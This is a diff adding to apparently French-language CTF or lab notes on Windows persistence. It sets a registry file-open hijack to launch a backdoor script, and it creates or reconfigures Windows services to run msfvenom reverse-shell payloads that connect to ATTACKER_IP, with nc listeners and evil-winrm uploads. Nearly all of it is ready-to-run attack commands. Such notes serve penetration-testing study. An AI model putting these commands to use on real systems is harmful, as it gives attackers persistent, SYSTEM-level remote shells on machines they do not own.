@@ -122,8 +122,52 @@ HKLM\Software\Classes\txtfile\shell\open\command
 ```
 ![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/80ca377c-f582-4aa9-a851-cdd0b7e4b4ab)
 
+
 On créer une backdoor.ps1 quelque part dans l'arborescence, puis on modifie la valeur `Data`
 ```
 Start-Process -NoNewWindow "c:\Windows\System32\backdoor.ps1 ATTACKER_IP 4448"
 C:\Windows\system32\NOTEPAD.EXE $args[0]
 ```
+
+<br>
+<br>
+
+## Creating backdoor services
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f exe-service -o rev-svc.exe
+nc -lnvp 1337
+```
+[evil-winrm]
+```
+upload rev-svc.exe
+sc.exe create MyService binPath= "C:\windows\rev-svc.exe" start= auto
+sc.exe start MyService
+```
+<br>
+<br>
+
+## Modifying existing services
+Reconnaissance
+```
+sc.exe query state=all
+```
+Interroger un service
+```
+sc.exe qc TheService
+```
+Payload
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
+nc -lnvp 5558
+```
+[evil-winrm]
+```
+upload rev-svc2.exe
+sc.exe config TheService binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+sc.exe stop/start TheService
+```
+
+<br>
+<br>
+
